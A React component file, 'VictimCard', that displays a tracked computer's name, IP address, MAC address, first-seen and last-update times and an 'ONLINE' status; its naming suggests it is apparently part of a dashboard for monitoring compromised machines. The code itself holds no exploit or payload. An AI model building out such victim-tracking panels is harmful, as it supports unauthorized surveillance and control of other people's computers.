import { Monitor, Globe, Fingerprint, Clock } from "lucide-react";

interface VictimCardProps {
  computer_name: string;
  ip: string;
  mac_address: string;
  created_at: string;
  updated_at: string;
}

const InfoRow = ({ icon: Icon, label, value }: { icon: any; label: string; value: string }) => (
  <div className="flex items-center gap-3 rounded-md bg-muted/50 px-4 py-3">
    <Icon className="h-4 w-4 text-primary shrink-0" />
    <span className="text-xs uppercase tracking-wider text-muted-foreground font-display w-28">{label}</span>
    <span className="font-mono-space text-sm text-foreground">{value}</span>
  </div>
);

const VictimCard = ({ computer_name, ip, mac_address, created_at, updated_at }: VictimCardProps) => {
  const formatDate = (d: string) => new Date(d).toLocaleString();

  return (
    <div className="rounded-lg border border-glow bg-card p-6">
      <div className="mb-4 flex items-center gap-3">
        <div className="flex h-10 w-10 items-center justify-center rounded-full bg-primary/10">
          <Monitor className="h-5 w-5 text-primary" />
        </div>
        <div>
          <h3 className="font-display text-lg font-bold text-foreground">{computer_name}</h3>
          <div className="flex items-center gap-1.5">
            <span className="h-2 w-2 rounded-full bg-success animate-pulse-glow" />
            <span className="text-xs text-success font-medium">ONLINE</span>
          </div>
        </div>
      </div>

      <div className="space-y-2">
        <InfoRow icon={Globe} label="IP Address" value={ip} />
        <InfoRow icon={Fingerprint} label="MAC" value={mac_address} />
        <InfoRow icon={Clock} label="First Seen" value={formatDate(created_at)} />
        <InfoRow icon={Clock} label="Last Update" value={formatDate(updated_at)} />
      </div>
    </div>
  );
};

export default VictimCard;
